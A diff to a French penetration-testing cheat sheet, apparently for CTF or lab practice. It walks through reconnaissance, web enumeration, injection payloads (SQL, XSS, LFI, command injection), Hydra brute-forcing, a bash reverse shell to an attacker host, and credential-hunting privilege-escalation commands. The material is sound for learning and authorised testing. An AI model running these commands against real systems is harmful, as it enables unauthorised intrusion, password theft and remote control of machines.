@@ -5,74 +5,100 @@
 PHASE 1 - PRÉPARATION & RECONNAISSANCE
 ---------------------------------------
 
+🎯 Objectif : identifier l’environnement, découvrir les cibles actives et collecter des infos utiles sans attaquer.
+
 1. Identifier son IP locale :
+➤ Commande :
     ifconfig     # ou : ip a
 
-2. Scanner le réseau local :
+2. Scanner le réseau local pour trouver les autres machines actives :
+➤ Commande :
     nmap -sn <IP>.1-254
     netdiscover -r <IP>/24
 
 3. Scanner les ports d'une cible :
+➤ Commande :
     nmap -A -T4 -p- <IP>
+    ℹ️​ Identifie tous les ports TCP, les versions des services, le système d'exploitation, etc.
 
 4. Identifier les services :
+➤ Commande :
     nmap -sV <IP>
 
-5. Vérifier si noms DNS détectés :
+5. Si un nom de domaine apparaît, tu veux le résoudre :
+➤ Commande :
     sudo nano /etc/hosts
     # Exemple : 192.168.1.12 web.local
+    ℹ️ Permet d'utiliser des noms comme `http://web.local` au lieu d'IP brutes.
 
-6. Informations passives :
+6. Collecter des informations passives supplémentaires :
+➤ Commande :
     whois <domaine>
     dig <domaine>
     nslookup <domaine>
+    ℹ️ Pour connaître les IP, serveurs DNS, MX, registrar, etc.
 
-7. Fingerprinting :
+7. Connaitre les technologies Web utilisées :
+➤ Commande :
     whatweb http://<IP>
     wappalyzer (navigateur)
+    ℹ️ Pour savoir si la cible utilise WordPress, Apache, PHP, etc.
 
 PHASE 2 - ENUMÉRATION & ANALYSE WEB
 ------------------------------------
 
-8. Enumération des répertoires :
+🎯 Objectif : identifier des chemins cachés, failles de config, vulnérabilités web, utilisateurs ou services web actifs.
+
+8. Port 80 ou 443 ouvert ? Enumération des répertoires et fichiers cachés :
+➤ Commande :
     gobuster dir -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
     dirb http://<IP>/
     dirsearch -u http://<IP>/ -e php,html,txt
 
 9. Analyse manuelle :
+➤ Checklist :
     - Inspecter le code source HTML
     - robots.txt, .git, .env, .bak, config.php, etc.
-    - Fichiers d'erreur
+    - Fichiers d'erreur ou config
     - Injection dans les URL et paramètres
 
 10. Scanner vulnérabilités :
+➤ Commande :
     nikto -h <IP> -p 80
+    ℹ️ Teste la présence de fichiers sensibles, versions vulnérables, headers faibles, etc.
 
-11. Détection de CMS :
+11. Si c'est un Wordpress :
+➤ Commande :
     wpscan --url http://<IP>/ --enumerate u
+    ℹ️ Pour récupérer les utilisateurs, plugins, thèmes et vulnérabilités WordPress.
 
-12. Bruteforce web (formulaire) :
+12. Bruteforce web (formulaire login) :
     hydra -l admin -P rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+    ℹ️ Teste les combinaisons utilisateur/mot de passe en masse via brute-force.
 
-13. BurpSuite (proxy d’analyse Web)
-    - Intercepter les requêtes HTTP (GET/POST)
-    - Copier les **cookies** ou les **requêtes complètes** pour SQLMap
-    - Rejouer, modifier, tester l’injection, fuzzing
-
-    Exemples utiles :
-    - Exporter la requête en format curl
-    - Intercepter un login, copier la requête POST
-    - Relever les headers : Cookie, Referer, Origin, etc.
+13. Intercepter et manipuler les requêtes Web en profondeur :
+    ➤ Outil : BurpSuite (proxy)
+    ➤ Ce que tu peux faire :
+        - Intercepter une requête POST ou GET
+        - Modifier les paramètres en temps réel
+        - Tester les injections SQL, XSS ou LFI
+        - Rejouer une authentification
+        - Exporter la requête en curl pour SQLMap
+        - Récupérer headers : Cookie, Referer, Origin...
 
 PHASE 3 - TESTS D’INJECTION / VULNÉRABILITÉS
 --------------------------------------------
 
-14. Injection SQL (manuelle) :
+🎯 Objectif : tester la résistance de l’application aux injections et vulnérabilités connues.
+
+14. Si un champ interagit avec une base de données (ex: ?id= ou formulaire) :
+➤ Payloads classiques (Faille SQL) :
     ' OR 1=1 --
     admin' --
+    ℹ️ Pour déclencher une erreur SQL ou bypass un formulaire de login.
 
-15. SQLMap (automatisé) :
-
+15. SQLMap (Faille SQL automatisé) :
+➤ Commandes :
     SQLMap simple :
     sqlmap -u "http://<IP>/page.php?id=1" --batch
 
@@ -81,50 +107,63 @@ PHASE 3 - TESTS D’INJECTION / VULNÉRABILITÉS
 
     SQLMap avec requête POST :
     sqlmap -u "http://<IP>/login.php" --data="username=admin&password=test" --cookie="PHPSESSID=..." --batch --dump
+    ℹ️ Pour identifier automatiquement les vulnérabilités, récupérer les bases, tables et données.
 
 16. XSS :
     <script>alert(1)</script>
 
-17. LFI / RFI :
+17. Si la cible inclut des fichiers (ex: ?page=home) :
+➤ Test LFI / RFI :
     ../../../../etc/passwd
     data://text/plain;base64,...
+    ℹ️ Pour lire des fichiers locaux (LFI) ou exécuter du code distant (RFI).
 
-18. SSTI :
+18. L’application semble utiliser un moteur de template ? :
+➤ SSTI :
     {{7*7}} ou {{request}}
+    ℹ️ Pour tester si des variables sont interprétées et exploitées côté serveur.
 
-19. Command injection :
+19. Si un champ est susceptible d’être injecté dans une commande système :
+➤ Commandes :
     ; whoami
     & id
     `uname -a`
+    ℹ️ Pour exécuter arbitrairement des commandes sur le système.
 
 PHASE 4 - ACCÈS / SHELL / ÉVASION
 ----------------------------------
 
-20. Reverse shell :
+🎯 Objectif : obtenir un accès interactif sur la machine cible et sortir d’un environnement restreint.
+
+20. Tu peux exécuter une commande distante ? :
+➤ Reverse shell
 
 Attaquant :
     nc -lvnp 4444
 
 Victime :
     bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1
-    echo '<base64_payload>' | base64 -d | bash
+    echo 'commande_reverse_shell' | base64 -d | bash
+
+    ℹ️ Pour ouvrir une connexion inversée et obtenir un shell sur Kali.
 
 21. SSH (si identifiants trouvés ou bruteforce réussi) :
 
 Connexion :
     ssh utilisateur@<IP>
 
-Exemple bruteforce (Hydra) :
+Exemple bruteforce SSH (Hydra) :
     hydra -l user -P rockyou.txt ssh://<IP>
 
 Connexion via clé privée :
     ssh -i id_rsa user@<IP>
     chmod 600 id_rsa
 
-22. Serveur de transfert (Kali) :
+22. Serveur de transfert (Kali) pour envoyer un fichier à la cible :
     python3 -m http.server 8000
+    ℹ️ Permet d’héberger temporairement des scripts comme linpeas, shells, etc.
 
-23. Transfert de fichier via Netcat :
+23. Transfert de fichier via Netcat (la cible ne peut pas télécharger en HTTP) :
     # Côté Kali (récepteur)
     nc -nlvp 7777 > fichier.txt
     # Côté victime
@@ -133,58 +172,71 @@ Connexion via clé privée :
 PHASE 5 - POST-EXPLOITATION / PRIVESC
 --------------------------------------
 
-24. Vérifier les SUID :
+🎯 Objectif : augmenter les privilèges (user → root), persister ou pivoter.
+
+24. Vérifier les fichiers executable en SUID :
     find / -perm -4000 -type f 2>/dev/null
+    ℹ️ Pour repérer des binaires exécutables avec les droits root.
 
 25. Rechercher fichiers sensibles :
+➤ Commandes :
     find / -name "*pass*" 2>/dev/null
     cat ~/.bash_history
     grep -i pass /etc/* -R 2>/dev/null
+    ℹ️ Pour repérer des fichiers de config, historiques ou secrets.
 
-26. Processus, services, ports :
+26. Connaître l’état de la machine :
     ps auxf
     systemctl --type=service
     netstat -tulnp
     ss -tuln
+    ℹ️ Pour voir les services en cours, connexions réseau et processus.
 
-27. Cronjobs :
+27. Les tâches planifiées sont parfois exploitables (Cronjobs) :
+➤ Commandes :
     crontab -l
     cat /etc/crontab
     ls -la /etc/cron*
+    ℹ️ Pour repérer des scripts exécutés en root automatiquement.
 
 28. Sudo / droits root :
     sudo -l
     sudo su
+    ℹ️ Pour savoir si certaines commandes peuvent être exécutées sans mot de passe → GTFOBins
 
-29. Binaires personnalisés :
+29. Si un binaire personnalisé est présent :
+➤ Commandes :
     ltrace ./binaire
     strace ./binaire
+    ℹ️ Pour observer les appels système, chaînes manipulées, fichiers ouverts.
 
-30. Outils de post-exploitation :
+30. Automatiser la recherche de failles :
+➤ Outils :
     linpeas.sh
     lse.sh
     pspy
+    ℹ️ Scanners de privilèges pour repérer des failles d’élévation connues.
 
 PHASE 6 - OUTILS DE BASE À CONNAÎTRE
 --------------------------------------
 
 🛠️ Outils principaux :
-- nmap
-- netdiscover
-- gobuster / dirb / dirsearch
-- sqlmap
-- nikto
-- wpscan
-- hydra
-- whatweb
-- BurpSuite
-- metasploit
-- john / hashcat
-- smbclient / enum4linux
-- python3 -m http.server
-- nc (netcat)
-- ltrace / strace
-- linpeas / lse / pspy
+- `nmap` → scan des ports, versions, OS
+- `netdiscover` → découverte réseau local
+- `gobuster`, `dirb`, `dirsearch` → bruteforce de répertoires
+- `sqlmap` → injections SQL automatisées
+- `nikto` → vulnérabilités Web simples
+- `wpscan` → WordPress vulnérabilités & users
+- `hydra` → bruteforce login (SSH, HTTP, FTP…)
+- `whatweb`, `wappalyzer` → fingerprint techno web
+- `BurpSuite` → manipulation HTTP, interception
+- `metasploit` → exploitation assistée
+- `john`, `hashcat` → crack de mots de passe
+- `smbclient`, `enum4linux` → énumération SMB (ports 139/445)
+- `python3 -m http.server` → serveur de transfert
+- `nc` (netcat) → transfert ou reverse shell
+- `ltrace`, `strace` → analyse de binaires
+- `linpeas`, `lse`, `pspy` → élévation automatique
 
 PHASE 7 - NOTES PERSO / AJOUTS
 -------------------------------
